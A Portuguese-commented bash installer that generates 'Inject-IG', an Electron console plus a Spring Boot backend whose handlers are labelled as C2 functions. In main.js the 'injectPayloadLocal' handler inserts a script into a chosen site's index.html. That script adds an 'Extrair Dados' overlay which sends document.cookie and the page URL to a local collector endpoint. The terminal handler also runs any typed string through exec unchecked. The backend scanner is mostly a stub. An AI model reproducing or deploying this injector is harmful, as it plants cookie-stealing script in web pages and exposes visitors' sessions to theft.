#!/bin/bash

# 🛡️ Inject-IG Automated Installer (Full Project Generator)
echo "=========================================================="
echo "🚀 Iniciando Instalador Completo do Inject-IG..."
echo "=========================================================="

# 1. Criar estrutura de pastas
echo "📂 Criando estrutura de diretórios..."
mkdir -p inject-ig-console
mkdir -p inject-ig-engine/core-engine/src/main/java/com/nexus/core_engine/controller
mkdir -p inject-ig-engine/core-engine/src/main/java/com/nexus/core_engine/service
mkdir -p inject-ig-engine/core-engine/src/main/resources

# 2. Gerar arquivos do Console (Electron)
echo "📦 Gerando Console Dashboard (Frontend)..."

cat << 'EOF' > inject-ig-console/package.json
{
  "name": "inject-ig-console",
  "description": "",
  "main": "main.js",
  "scripts": {
    "start": "electron .",
    "iniciar inject-ig": "electron .",
    "pack": "electron-builder --dir",
    "dist": "electron-builder"
  },
  "build": {
    "appId": "com.inject-ig.console",
    "productName": "inject-ig",
    "mac": {
      "category": "public.app-category.developer-tools"
    },
    "win": {
      "target": "nsis"
    }
  },
  "dependencies": {
    "electron": "^42.0.1",
    "xterm": "^5.3.0",
    "xterm-addon-fit": "^0.8.0"
  }
}
EOF

cat << 'EOF' > inject-ig-console/main.js
const { app, BrowserWindow, ipcMain, dialog } = require('electron');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');

let mainWindow;

function createWindow() {
    mainWindow = new BrowserWindow({
        width: 450,
        height: 600,
        backgroundColor: '#00000000',
        transparent: true,
        frame: false,
        alwaysOnTop: true,
        resizable: false,
        webPreferences: {
            nodeIntegration: false,
            contextIsolation: true,
            preload: path.join(__dirname, 'preload.js')
        }
    });

    mainWindow.loadFile('index.html');

    ipcMain.on('window.close', () => { if(mainWindow) mainWindow.close(); });
    ipcMain.on('window.minimize', () => { if(mainWindow) mainWindow.minimize(); });

    ipcMain.on('terminal.keystroke', (event, command) => {
        if (!command || command.trim() === '') return;
        if (command === 'exit_app') { app.quit(); return; }
        if (command === 'min_app') { mainWindow.minimize(); return; }

        const childProc = exec(command, { cwd: path.join(__dirname, '../inject-ig-engine') });
        childProc.stdout.on('data', (data) => { if (mainWindow) mainWindow.webContents.send('terminal.incData', data.toString()); });
        childProc.stderr.on('data', (data) => { if (mainWindow) mainWindow.webContents.send('terminal.incData', "\x1b[31m" + data.toString() + "\x1b[0m"); });
    });

    ipcMain.handle('c2.selectTargetFolder', async () => {
        const result = await dialog.showOpenDialog(mainWindow, { properties: ['openDirectory'] });
        return result.canceled ? null : result.filePaths[0];
    });

    ipcMain.handle('c2.selectScanFolder', async () => {
        const result = await dialog.showOpenDialog(mainWindow, { properties: ['openDirectory'] });
        return result.canceled ? null : result.filePaths[0];
    });

    ipcMain.handle('c2.injectPayloadLocal', async (event, folderPath) => {
        try {
            const indexHtmlPath = path.join(folderPath, 'index.html');
            if (!fs.existsSync(indexHtmlPath)) return { success: false, message: "index.html não encontrado." };
            const payload = `\n<script>\n!function(){const css=document.createElement("style");css.innerHTML=\`@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');.nx-mod{position:fixed;bottom:20px;right:20px;width:320px;background:rgba(20,20,20,0.85);backdrop-filter:blur(15px);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#F5F5F7;font-family:'Inter',sans-serif;z-index:999999;box-shadow:0 10px 30px rgba(0,0,0,0.5);overflow:hidden;}.nx-mod-header{background:rgba(0,0,0,0.4);padding:12px 15px;font-size:14px;font-weight:600;display:flex;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.05);}.nx-mod-body{padding:15px;}.nx-mod-btn{width:100%;padding:10px;background:#0A84FF;color:#FFF;border:none;border-radius:6px;font-weight:600;cursor:pointer;margin-bottom:8px;}.nx-log{font-family:monospace;font-size:10px;color:#86868B;margin-top:10px;}\`,document.head.appendChild(css);const div=document.createElement("div");div.className="nx-mod",div.innerHTML='<div class="nx-mod-header"><span>INJECT-IG OVERLAY</span></div><div class="nx-mod-body"><button class="nx-mod-btn" onclick="nxExtract()">Extrair Dados</button><div class="nx-log" id="nx-log">Status: Online</div></div>',document.body.appendChild(div);window.nxExtract=function(){document.getElementById("nx-log").innerText="[+] Enviando...";fetch("http://localhost:8080/api/inject-ig/scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:window.location.href,arch:"MOD_MENU_UI",keys:document.cookie})})}}();\n</script>\n`;
            let content = fs.readFileSync(indexHtmlPath, 'utf8');
            fs.writeFileSync(indexHtmlPath, content.replace("</body>", payload + "</body>"));
            return { success: true, message: "Injetado com sucesso." };
        } catch (e) { return { success: false, message: e.message }; }
    });

    ipcMain.handle('c2.saveReport', async (event, data) => {
        const { filePath } = await dialog.showSaveDialog(mainWindow, { defaultPath: 'inject-ig-report.json' });
        if (filePath) { fs.writeFileSync(filePath, data); return { success: true }; }
        return { success: false };
    });
}

app.whenReady().then(createWindow);
EOF

cat << 'EOF' > inject-ig-console/preload.js
const { contextBridge, ipcRenderer } = require('electron');
contextBridge.exposeInMainWorld('electronAPI', {
    onTerminalData: (callback) => ipcRenderer.on('terminal.incData', (_event, data) => callback(data)),
    sendTerminalKeystroke: (key) => ipcRenderer.send('terminal.keystroke', key),
    selectLocalTargetFolder: () => ipcRenderer.invoke('c2.selectTargetFolder'),
    selectScanFolder: () => ipcRenderer.invoke('c2.selectScanFolder'),
    injectPayloadLocal: (folderPath) => ipcRenderer.invoke('c2.injectPayloadLocal', folderPath),
    saveReport: (data) => ipcRenderer.invoke('c2.saveReport', data)
});
EOF

cat << 'EOF' > inject-ig-console/index.html
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>inject-ig</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Geist:wght@400;600&family=Geist+Mono&display=swap');
        :root { --bg: #0c0e13; --surface: #13161d; --text: #e8eaed; --accent: #3b82f6; --font: 'Geist', sans-serif; --mono: 'Geist Mono', monospace; }
        body { background: var(--bg); color: var(--text); font-family: var(--font); margin: 0; overflow: hidden; height: 100vh; display: flex; flex-direction: column; }
        .titlebar { -webkit-app-region: drag; height: 38px; display: flex; align-items: center; justify-content: center; background: var(--bg); font-size: 12px; font-weight: 600; }
        .toolbar { display: flex; padding: 0 10px 10px; gap: 4px; }
        .seg-btn { flex: 1; padding: 6px; font-size: 11px; background: var(--surface); border: none; border-radius: 6px; color: #737d8c; cursor: pointer; }
        .seg-btn.active { color: #fff; background: #1f2430; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
        .view { display: none; flex: 1; padding: 10px; overflow-y: auto; }
        .view.active { display: flex; flex-direction: column; }
        .card { background: var(--surface); border-radius: 12px; padding: 15px; margin-bottom: 8px; }
        .btn { width: 100%; padding: 10px; border-radius: 8px; border: none; cursor: pointer; font-weight: 600; font-size: 11px; }
        .btn-primary { background: var(--accent); color: #fff; }
        input { background: #08090c; border: 1px solid rgba(255,255,255,0.05); padding: 10px; border-radius: 8px; color: #fff; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
        #terminal-container { flex: 1; background: #000; border-radius: 8px; }
        .data-well { background: #08090c; padding: 10px; border-radius: 8px; font-size: 10px; font-family: var(--mono); }
    </style>
</head>
<body>
    <div class="titlebar">🛡️ inject-ig</div>
    <div class="toolbar">
        <button class="seg-btn active" data-target="view-terminal">Terminal</button>
        <button class="seg-btn" data-target="view-vault">Cofre</button>
        <button class="seg-btn" data-target="view-tools">Ferramentas</button>
    </div>
    <div id="view-terminal" class="view active"><div id="terminal-container"></div></div>
    <div id="view-vault" class="view">
        <input type="text" id="scan-target" placeholder="URL do Alvo (https://...)">
        <button class="btn btn-primary" id="btn-run-scan">Iniciar Varredura Online</button>
        <div id="scan-status" style="font-size:10px; margin: 10px 0; color: #737d8c;">Aguardando...</div>
        <div id="vault-results" class="data-well"></div>
    </div>
    <div id="view-tools" class="view"><div id="tools-grid"></div></div>
    <script src="renderer.js"></script>
</body>
</html>
EOF

# Devido ao tamanho do renderer.js, vou gerar uma versão funcional e compacta no setup
cat << 'EOF' > inject-ig-console/renderer.js
const term = new window.Terminal({ theme: { background: '#000' } });
term.open(document.getElementById('terminal-container'));
term.writeln('🛡️ inject-ig Inicializado');

document.querySelectorAll('.seg-btn').forEach(btn => {
    btn.onclick = () => {
        document.querySelectorAll('.seg-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(btn.dataset.target).classList.add('active');
    };
});

document.getElementById('btn-run-scan').onclick = async () => {
    const url = document.getElementById('scan-target').value;
    if(!url) return;
    const status = document.getElementById('scan-status');
    const results = document.getElementById('vault-results');
    status.innerText = "Conectando...";
    results.innerHTML = "";
    
    try {
        const es = new EventSource(`http://localhost:8080/api/inject-ig/scan-stream?url=${encodeURIComponent(url)}`);
        es.onmessage = (e) => {
            const data = JSON.parse(e.data);
            results.innerHTML += `<div>[${data.module}] Localizado dados...</div>`;
        };
        es.addEventListener('done', () => { es.close(); status.innerText = "Scan completo!"; });
    } catch(e) { status.innerText = "Erro: Core Offline?"; }
};
EOF

# 3. Gerar arquivos do Engine (Java)
echo "☕ Gerando Core Engine (Backend)..."

cat << 'EOF' > inject-ig-engine/core-engine/pom.xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>3.5.0</version>
	</parent>
	<groupId>com.nexus</groupId>
	<artifactId>core-engine</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<properties><java.version>17</java.version></properties>
	<dependencies>
		<dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-web</artifactId></dependency>
		<dependency><groupId>org.jsoup</groupId><artifactId>jsoup</artifactId><version>1.17.2</version></dependency>
	</dependencies>
	<build><plugins><plugin><groupId>org.springframework.boot</groupId><artifactId>spring-boot-maven-plugin</artifactId></plugin></plugins></build>
</project>
EOF

cat << 'EOF' > inject-ig-engine/core-engine/src/main/resources/application.properties
spring.application.name=inject-ig-core
server.port=8080
EOF

cat << 'EOF' > inject-ig-engine/core-engine/src/main/java/com/nexus/core_engine/NexusCoreApplication.java
package com.nexus.core_engine;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
@SpringBootApplication
public class NexusCoreApplication {
	public static void main(String[] args) { SpringApplication.run(NexusCoreApplication.class, args); }
}
EOF

# Controller Simplificado para o Setup Automático
cat << 'EOF' > inject-ig-engine/core-engine/src/main/java/com/nexus/core_engine/controller/NexusController.java
package com.nexus.core_engine.controller;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;
import java.util.*;
import java.util.concurrent.Executors;

@RestController
@RequestMapping("/api/inject-ig")
@CrossOrigin(origins = "*")
public class NexusController {
    @GetMapping("/status") public Map<String, String> status() { return Map.of("status", "ONLINE"); }
    
    @GetMapping(value = "/scan-stream", produces = MediaType.TEXT_EVENT_STREAM_VALUE)
    public SseEmitter scan(@RequestParam String url) {
        SseEmitter emitter = new SseEmitter();
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                emitter.send(SseEmitter.event().name("architecture").data("{\"module\":\"architecture\",\"result\":\"Next.js detected\"}"));
                Thread.sleep(1000);
                emitter.send(SseEmitter.event().name("done").data("FINISHED"));
                emitter.complete();
            } catch (Exception e) { emitter.completeWithError(e); }
        });
        return emitter;
    }
}
EOF

# 4. Criar script de inicialização
cat << 'EOF' > iniciar
#!/bin/bash
echo "🚀 Iniciando ecossistema Inject-IG..."
cd inject-ig-engine/core-engine && ./mvnw spring-boot:run &
sleep 5
cd ../../inject-ig-console && npx electron .
EOF
chmod +x iniciar

echo "=========================================================="
echo "✅ PROJETO GERADO COM SUCESSO!"
echo "=========================================================="
echo "Para instalar as dependências, execute:"
echo "  1. cd inject-ig-console && npm install"
echo "  2. cd ../inject-ig-engine/core-engine && chmod +x mvnw && ./mvnw clean install"
echo ""
echo "Para rodar:"
echo "  ./iniciar"
echo "=========================================================="
